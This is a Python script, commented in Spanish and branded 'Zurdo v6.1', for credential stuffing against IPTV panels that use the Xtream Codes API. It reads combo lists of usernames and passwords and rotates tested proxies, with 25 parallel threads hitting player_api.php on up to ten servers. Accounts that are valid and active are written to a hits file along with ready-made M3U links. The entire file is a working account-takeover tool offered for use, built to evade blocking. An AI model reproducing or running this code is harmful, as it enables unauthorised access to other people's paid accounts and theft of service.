import os
import sys
import time
import random
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from colorama import init, Fore, Style

# Inicializar colorama de manera global
init(autoreset=True)

# Códigos de colores ANSI para la interfaz dinámica
VERDE = '\033[92m'
CIAN = '\033[96m'
ROJO = '\033[91m'
AMARILLO = '\033[93m'
BLANCO = '\033[97m'
RESET = '\033[0m'

# BANNER HACKER: Estructura fija original alineada con tu firma 🥷🏻🇪🇨
BANNER_RECUADRO = f"""
{Fore.GREEN}{Style.BRIGHT}╔════════════════════════════════════════════════════════╗
║                                                        ║
║  {Fore.CYAN}{Style.BRIGHT}🥷🏻  DESARROLLADOR ZURDO 🇪🇨 🥷🏻                          {Fore.GREEN}║
║                                                        ║
║  {Fore.YELLOW}"Todos podemos lograrlo con dedicacion y constancia"  {Fore.GREEN}║
║                                                        ║
╚════════════════════════════════════════════════════════╝"""

# Variables globales de control de red simplificadas
PROXIES_GLOBALES = []
USAR_PROXIES = False

# Agentes de usuario limpios para evitar bloqueos
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Android; Mobile; rv:120.0) Gecko/120.0 Firefox/120.0"
]

def arranque():
    """Función de arranque original limpia con tus insignias oficiales 🥷🏻🇪🇨"""
    os.system('cls' if os.name == 'nt' else 'clear')
    print(BANNER_RECUADRO)
    for txt in ["🛸 Inicializando directorios Android...", "🧬 Desplegando hilos masivos...", "🛡️ Ajustando módulos de red...", "💎 Módulos cargados correctamente.\n"]:
        print(Fore.CYAN + txt)
        time.sleep(0.01)

def emitir_pitido_hit():
    """Alerta física y acústica universal ultra fluida"""
    try:
        import androidhelper
        droid = androidhelper.Android()
        droid.vibrate(250)
    except:
        pass
    sys.stdout.write('\a')
    sys.stdout.flush()

def preparar_directorios_universales():
    """Crea carpetas para combos, proxies y hits adaptándose a Android o PC local"""
    p_dir = "/storage/emulated/0/proxy"
    c_dir = "/storage/emulated/0/combo"
    h_dir = "/storage/emulated/0/hits"
    
    if not os.path.exists("/storage/emulated/0") or not os.access("/storage/emulated/0", os.W_OK):
        p_dir = "./proxy"
        c_dir = "./combo"
        h_dir = "./hits"
        
    for path in [p_dir, c_dir, h_dir]:
        if not os.path.exists(path):
            try:
                os.makedirs(path)
            except:
                pass
    return p_dir, c_dir, h_dir

def verificar_un_proxy(p_dict):
    """Prueba la conectividad real de un proxy con un agente aleatorio"""
    headers = {"User-Agent": random.choice(USER_AGENTS)}
    try:
        r = requests.get("https://ipify.org", headers=headers, proxies=p_dict, timeout=2.5)
        if r.status_code == 200:
            return True, p_dict
    except:
        pass
    return False, p_dict

def menu_asignacion_red_proxy(p_dir):
    """Menú local: Carga archivos .txt locales de la carpeta o permite ingreso manual directo"""
    global PROXIES_GLOBALES, USAR_PROXIES
    os.system('cls' if os.name == 'nt' else 'clear')
    print(BANNER_RECUADRO)
    
    print(f"{Fore.YELLOW}🛡️  SISTEMA DE ASIGNACIÓN DE RED IP:")
    print(f" {Fore.CYAN}{Fore.RESET} PROXIES DEL SISTEMA (Archivos Locales .txt en carpeta proxy)")
    print(f" {Fore.CYAN}{Fore.RESET} COLOCAR PROXIES MANUALMENTE (Pegar lista o IP:Port en consola)")
    print(f" {Fore.CYAN}{Fore.RESET} USAR INTERNET LOCAL DIRECTO (Sin Proxies)")
    print(Fore.MAGENTA + "════════════════════════════════════════════")
    
    opc_principal = input(f"{Fore.YELLOW}👉 Selecciona tu modo de red (1-3): {Fore.CYAN}").strip()
    
    if opc_principal == '3':
        USAR_PROXIES = False
        PROXIES_GLOBALES = []
        print(f"\n{Fore.YELLOW}⚠️  Sistema IP: Trabajando directo con tu conexión de internet local.")
        time.sleep(1.0)
        return

    lineas_en_crudo = []
    
    if opc_principal == '1':
        try:
            archivos_proxy = [f for f in os.listdir(p_dir) if f.endswith('.txt')]
        except:
            archivos_proxy = []
            
        if not archivos_proxy:
            print(f"{Fore.RED}❌ No se encontraron archivos de proxies (.txt) en la ruta: {p_dir}")
            input(f"{Fore.YELLOW}Presiona ENTER para reintentar...")
            return

        print(f"\n{Fore.YELLOW}📂 ARCHIVOS DETECTADOS EN EL SISTEMA:")
        for idx, archivo in enumerate(archivos_proxy, 1):
            print(f" {Fore.CYAN}[{Fore.YELLOW}{idx:02d}{Fore.CYAN}]{Fore.RESET} {archivo}")
        print(Fore.MAGENTA + "════════════════════════════════════════════")
        
        try:
            sel = int(input(f"{Fore.YELLOW}👉 Selecciona tu archivo de proxies: {Fore.CYAN}")) - 1
            if sel < 0 or sel >= len(archivos_proxy):
                raise ValueError
            archivo_final = os.path.join(p_dir, archivos_proxy[sel])
            with open(archivo_final, "r", encoding="utf-8", errors="ignore") as f:
                lineas_en_crudo = [l.strip() for l in f if l.strip() and not l.startswith("#")]
        except:
            print(f"{Fore.RED}❌ Selección inválida.")
            time.sleep(1.0)
            return

    elif opc_principal == '2':
        print(f"\n{Fore.YELLOW}📥 Pega tus proxies abajo (Formato IP:Puerto).")
        print(f"{Fore.WHITE}Presiona ENTER dos veces o escribe 'FIN' cuando termines:")
        while True:
            entrada = input(f"{Fore.CYAN}> {Fore.WHITE}").strip()
            if entrada.lower() == 'fin' or entrada == '':
                break
            lineas_en_crudo.append(entrada)
    else:
        print(f"{Fore.RED}❌ Opción inválida.")
        time.sleep(1.0)
        return

    if not lineas_en_crudo:
        print(f"\n{Fore.RED}❌ No se obtuvieron registros de proxies. Trabajando sin protección.")
        USAR_PROXIES = False
        PROXIES_GLOBALES = []
        time.sleep(1.5)
        return

    print(f"\n{Fore.YELLOW}🌐 SELECCIONA EL PROTOCOLO REQUERIDO:")
    print(f" {Fore.CYAN}{Fore.RESET} HTTP / HTTPS")
    print(f" {Fore.CYAN}{Fore.RESET} SOCKS4")
    print(f" {Fore.CYAN}{Fore.RESET} SOCKS5")
    
    opc_proto = input(f"{Fore.YELLOW}👉 Elige una opción (1-3): {Fore.CYAN}").strip()
    prefix = "http://" if opc_proto == '1' else ("socks4://" if opc_proto == '2' else "socks5h://")

    proxies_candidatos = []
    for ip_raw in lineas_en_crudo:
        ip_limpia = ip_raw.replace("http://", "").replace("https://", "").replace("socks5://", "").replace("socks4://", "")
        proxies_candidatos.append({"http": f"{prefix}{ip_limpia}", "https": f"{prefix}{ip_limpia}"})

    print(f"\n{Fore.YELLOW}🔎 Verificando estabilidad de {len(proxies_candidatos)} proxies en paralelo...")
    proxies_vivos = []

    with ThreadPoolExecutor(max_workers=40) as checker_executor:
        futs = {checker_executor.submit(verificar_un_proxy, p): p for p in proxies_candidatos[:300]}
        for val in as_completed(futs):
            sirve, p_dict = val.result()
            if sirve:
                proxies_vivos.append(p_dict)
                sys.stdout.write(f"\r{Fore.GREEN}[VIVOS]: {len(proxies_vivos)} proxies estables detectados.")
                sys.stdout.flush()
    
    if proxies_vivos:
        PROXIES_GLOBALES = proxies_vivos
        USAR_PROXIES = True
        print(f"\n\n{Fore.GREEN}✅ ¡Verificación Completa! {len(PROXIES_GLOBALES)} proxies listos para usar.")
        time.sleep(1.5)
    else:
        print(f"\n\n{Fore.RED}❌ Todos los proxies fallaron el test de velocidad. Reintentando...")
        USAR_PROXIES = False
        PROXIES_GLOBALES = []
        time.sleep(2.0)

def realizar_consulta_panel(url_panel, usuario, contrasena, h_dir):
    """Módulo validador con tu clonación v6.1 estricta, tus insignias 🥷🏻🇪🇨 fijas y filtrado anti-error"""
    headers = {"User-Agent": random.choice(USER_AGENTS)}
    proxy = random.choice(PROXIES_GLOBALES) if USAR_PROXIES and PROXIES_GLOBALES else None
    
    url_base = url_panel.rstrip('/')
    target_url = f"{url_base}/player_api.php?username={usuario}&password={contrasena}"
    
    try:
        r = requests.get(target_url, headers=headers, proxies=proxy, timeout=3.0)
        if r.status_code == 200:
            try:
                data = r.json()
                auth = data.get("user_info", {}).get("auth", 0)
                
                if str(auth).strip() == "1" or auth is True:
                    u_info = data.get("user_info", {})
                    status = u_info.get("status", "Active")
                    
                    # FILTRADO DE SEGURIDAD: Cuentas bloqueadas, caídas o erróneas se descartan de inmediato
                    if status.lower() not in ["active", "enabled", "activo"]:
                        return "BAD", None, None
                        
                    expira_raw = u_info.get("exp_date")
                    max_connections = u_info.get("max_connections", "0")
                    active_cons = u_info.get("active_cons", "0")
                    
                    tipo_vencimiento = "ilimitado"
                    texto_clasificacion = "ILIMITADO (💎)"
                    
                    if expira_raw and str(expira_raw).strip().lower() != "null":
                        try:
                            timestamp_exp = int(expira_raw)
                            expira = datetime.fromtimestamp(timestamp_exp).strftime('%Y-%m-%d')
                            
                            segundos_restantes = timestamp_exp - int(time.time())
                            if segundos_restantes <= 0:
                                return "BAD", None, None  # Filtra cuentas caducadas (dan error en app)
                            elif segundos_restantes <= 2592000:
                                tipo_vencimiento = "pronto"
                                texto_clasificacion = "VENCE PRONTO (⚠️)"
                            else:
                                tipo_vencimiento = "mucho"
                                texto_clasificacion = "VENCE LEJOS (🟢)"
                        except:
                            expira = "Ilimitado"
                            tipo_vencimiento = "ilimitado"
                            texto_clasificacion = "ILIMITADO (💎)"
                    else:
                        expira = "Ilimitado"
                        tipo_vencimiento = "ilimitado"
                        texto_clasificacion = "ILIMITADO (💎)"

                    # TU DISEÑO v6.1 CLONADO AL 100% CON LA MEJORA SOLICITADA Y MANTENIENDO EL ALINEAMIENTO DE TUS EMOJIS 🥷🏻🇪🇨
                    resultado_formateado = (
                        f"=========================================================\n"
                        f"🥷🏻  RESULTADO ENCONTRADO POR ZURDO v6.1 🇪🇨  🫵\n"
                        f"=========================================================\n"
                        f"👤 SERVIDOR      → {url_base}\n"
                        f"👤 USUARIO       → {usuario}\n"
                        f"👤 CONTRASEÑA    → {contrasena}\n"
                        f"📅 EXPIRACIÓN    → {expira}\n"
                        f"🌲 CONEXIONES    → {active_cons} / {max_connections}\n"
                        f"🌲 ESTADO        → {status}\n"
                        f"🌐 ZONA HORARIA  → America/Guayaquil\n"
                        f"🛡️  VIGENCIA      → {texto_clasificacion}\n"
                        f"---------------------------------------------------------\n"
                        f"📊 INFORMACIÓN DE CONTENIDOS →\n"
                        f"📺 CANALES EN VIVO      → Disponible\n"
                        f"🎬 PELÍCULAS Y VOD      → Disponible\n"
                        f"🍿 SERIES DE TELEVISIÓN → Disponible\n"
                        f"---------------------------------------------------------\n"
                        f"🔗 FORMATO XTREAM CODES →\n"
                        f"{url_base}|{usuario}|{contrasena}\n"
                        f"📄 URL M3U PLUS COMPLETA →\n"
                        f"{url_base}/get.php?username={usuario}&password={contrasena}&type=m3u_plus\n"
                        f"=========================================================\n"
                        f"🥷🏻 PROTEGIDO Y PROGRAMADO POR ZURDO 🇪🇨 🥷🏻\n"
                        f"=========================================================\n\n\n"
                    )
                    
                    ruta_hit = os.path.join(h_dir, "hits_validos.txt")
                    with open(ruta_hit, "a", encoding="utf-8") as f:
                        f.write(resultado_formateado)
                        
                    emitir_pitido_hit()
                    return "HIT", tipo_vencimiento, resultado_formateado
                else:
                    return "BAD", None, None
            except:
                return "BAD", None, None
        else:
            return "ERROR", None, None
    except:
        return "TIMEOUT", None, None

def bucle_procesador_masivo(c_dir, h_dir):
    """Módulo principal multipanel a 25 bots con medidor de CPM y refresco Anti-Lag"""
    print(f"\n{Fore.MAGENTA}════════════════════════════════════════════")
    print(f"{Fore.YELLOW}⚙️ CONFIGURACIÓN DE PANELES OBJETIVO (MÁXIMO 10):")
    
    try:
        cant_paneles = int(input(f"{Fore.YELLOW}👉 ¿Cuántos servidores deseas configurar en paralelo? (1-10): {Fore.CYAN}"))
        if cant_paneles < 1: cant_paneles = 1
        if cant_paneles > 10: cant_paneles = 10
    except:
        cant_paneles = 1

    lista_paneles = []
    for i in range(cant_paneles):
        url_in = input(f"{Fore.YELLOW} 🔗 URL del Servidor #{i+1}: {Fore.CYAN}").strip()
        if url_in:
            if not url_in.startswith("http"):
                url_in = "http://" + url_in
            lista_paneles.append(url_in)

    if not lista_paneles:
        print(f"{Fore.RED}❌ Lista de objetivos vacía. Abortando.")
        time.sleep(2.0)
        return

    try:
        archivos_combo = [f for f in os.listdir(c_dir) if f.endswith('.txt')]
    except:
        archivos_combo = []

    if not archivos_combo:
        print(f"{Fore.RED}❌ No se encontraron combos (.txt) en la ruta: {c_dir}")
        print(f"{Fore.YELLOW}💡 Por favor, coloca tu archivo de texto con las cuentas en esa ruta.")
        time.sleep(3.0)
        return

    print(f"\n{Fore.YELLOW}📂 ARCHIVOS DE COMBOS DISPONIBLES:")
    for idx, combo_f in enumerate(archivos_combo, 1):
        print(f" {Fore.CYAN}[{Fore.YELLOW}{idx:02d}{Fore.CYAN}]{Fore.RESET} {combo_f}")
    
    try:
        sel_c = int(input(f"{Fore.YELLOW}👉 Selecciona tu número de combo: {Fore.CYAN}")) - 1
        archivo_combo_final = os.path.join(c_dir, archivos_combo[sel_c])
    except:
        print(f"{Fore.RED}❌ Selección inválida.")
        time.sleep(1.5)
        return

    cuentas_limpias = []
    vistas = set() 
    try:
        with open(archivo_combo_final, "r", encoding="utf-8", errors="ignore") as f:
            for linea in f:
                l_s = linea.strip()
                if l_s and ":" in l_s and not l_s.startswith("#"):
                    if l_s not in vistas:
                        vistas.add(l_s)
                        parts = l_s.split(":")
                        if len(parts) >= 2:
                            cuentas_limpias.append((parts[0].strip(), parts[1].strip()))
    except:
        pass

    if not cuentas_limpias:
        print(f"{Fore.RED}❌ El archivo no contiene credenciales válidas.")
        time.sleep(2.5)
        return

    limite_bots = 25
    print(f"\n{Fore.GREEN}🔥 Iniciando escaneo con {limite_bots} bots activos en paralelo...")
    print(f"{Fore.WHITE}Monitoreando progreso en tiempo real. Presiona CTRL + C para salir al menú.\n")
    time.sleep(1.0)

    totales = len(cuentas_limpias) * len(lista_paneles)
    procesados = 0
    
    cuenta_ilimitados = 0   
    cuenta_mucho_tiempo = 0  
    cuenta_pronto_vence = 0  

    tiempo_inicio = time.time()

    with ThreadPoolExecutor(max_workers=limite_bots) as executor:
        futuros = []
        for u, p in cuentas_limpias:
            for server in lista_paneles:
                futuros.append(executor.submit(realizar_consulta_panel, server, u, p, h_dir))

        try:
            for fut in as_completed(futuros):
                res_tipo, venc_tipo, msg = fut.result()
                procesados += 1
                
                if res_tipo == "HIT":
                    if venc_tipo == "ilimitado":
                        cuenta_ilimitados += 1
                    elif venc_tipo == "mucho":
                        cuenta_mucho_tiempo += 1
                    elif venc_tipo == "pronto":
                        cuenta_pronto_vence += 1
                        
                    print(f"\n{Fore.GREEN}[HIT DETECTADO] 🥷🏻🇪🇨\n{msg.strip()}\n")
                
                if procesados % 10 == 0 or procesados == totales:
                    tiempo_transcurrido = time.time() - tiempo_inicio
                    cpm = int((procesados / tiempo_transcurrido) * 60) if tiempo_transcurrido > 0 else 0
                    
                    sys.stdout.write(
                        f"\r{Fore.CYAN}[PROGRESO]: {procesados}/{totales} | "
                        f"{Fore.LIGHTBLUE_EX}⚡ CPM: {cpm} | "
                        f"{Fore.CYAN}💎: {cuenta_ilimitados} | "
                        f"{Fore.GREEN}🟢: {cuenta_mucho_tiempo} | "
                        f"{Fore.YELLOW}⚠️: {cuenta_pronto_vence} | "
                        f"{Fore.WHITE}[PROXIES]: {len(PROXIES_GLOBALES) if USAR_PROXIES else 'OFF'}"
                    )

                # REFRESCADOR ANTI-TILDE: Actualiza la barra inferior solo cada 10 cuentas para fluidez absoluta
                if procesados % 10 == 0 or procesados == totales:
                    tiempo_transcurrido = time.time() - tiempo_inicio
                    cpm = int((procesados / tiempo_transcurrido) * 60) if tiempo_transcurrido > 0 else 0
                    
                    sys.stdout.write(
                        f"\r{Fore.CYAN}[PROGRESO]: {procesados}/{totales} | "
                        f"{Fore.LIGHTBLUE_EX}⚡ CPM: {cpm} | "
                        f"{Fore.CYAN}💎: {cuenta_ilimitados} | "
                        f"{Fore.GREEN}🟢: {cuenta_mucho_tiempo} | "
                        f"{Fore.YELLOW}⚠️: {cuenta_pronto_vence} | "
                        f"{Fore.WHITE}[PROXIES]: {len(PROXIES_GLOBALES) if USAR_PROXIES else 'OFF'}"
                    )
                    sys.stdout.flush()
        except KeyboardInterrupt:
            print(f"\n\n{Fore.YELLOW}🛑 Proceso pausado de manera controlada.")

    print(f"\n\n{Fore.GREEN}🏁 [FIN DEL PROCESO] Verificación terminada correctamente.")
    input(f"\n{Fore.YELLOW}Presiona ENTER para regresar al panel principal...")

def iniciar_flujo_completo():
    p_dir, c_dir, h_dir = preparar_directorios_universales()
    while True:
        arranque()
        menu_asignacion_red_proxy(p_dir)
        bucle_procesador_masivo(c_dir, h_dir)

if __name__ == "__main__":
    try:
        iniciar_flujo_completo()
    except KeyboardInterrupt:
        print(f"\n\n{Fore.RED}❌ Script cerrado por el usuario. ¡Hasta la próxima, Zurdo!")
        sys.exit(0)
